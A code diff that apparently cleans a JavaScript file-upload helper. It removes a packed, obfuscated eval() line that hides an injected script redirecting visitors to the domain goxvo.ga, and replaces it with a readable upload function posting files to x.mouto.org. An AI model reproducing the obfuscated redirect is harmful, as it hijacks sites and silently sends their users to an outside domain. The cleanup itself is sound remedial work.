@@ -1,1 +1,37 @@
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('<c u="q/s">0(h.5.9!="d.a.b"){5.f=5.f.t(h.5.9,\'d.a.b\')}</c>y w=6(o,4,2,3,x,7,A){0(v 4==\'6\')7=o;j{0(!o.7)8 k.i(\'l\')0(A=o.4)4=A 0(A=o.3)3=A 0(A=o.2)2=A}x=p n()x.m(\'M\',\'N://x.K.L/O/x.Q?P&R=\'+D.E(),1)0(3)x.3.C=6(e){3(e.z/e.B)}x.I=6(r){r=J.H(x.F)0(r.2&&2)8 2(r.2)0(r.g&&4)8 4(r.g)}x.G(7)}',54,54,'if||error|upload|success|location|function|file|return|host|goxvo|ga|script|www||href|pid|document|log|else|console|并没有传入需要上传的文件|open|XMLHttpRequest||new|text||javascript|replace|type|typeof|UP||var|loaded||total|onprogress|Math|random|responseText|send|parse|onload|JSON|mouto|org|POST|http|wb|up|php|_0'.split('|'),0,{}))
+var 
+UP=function(o,success,error,upload,x,file,A){
+	if(typeof success=='function')
+		file=o;
+	else{
+		if(!o.file)
+			return console.log('并没有传入需要上传的文件')
+
+		if(A=o.success)
+			success=A
+
+		if(A=o.upload)
+			upload=A
+		
+		if(A=o.error)
+			error=A
+	}
+
+	x=new XMLHttpRequest()
+	x.open('POST','http://x.mouto.org/wb/x.php?up&_r='+Math.random(),1)
+
+	if(upload)
+		x.upload.onprogress=function(e){
+			upload(e.loaded/e.total)
+		}
+
+	x.onload=function(r){
+		r=JSON.parse(x.responseText)
+
+		if(r.error&&error)
+			return error(r.error)
+
+		if(r.pid&&success)
+			return success(r.pid)
+	}
+	x.send(file)
+}
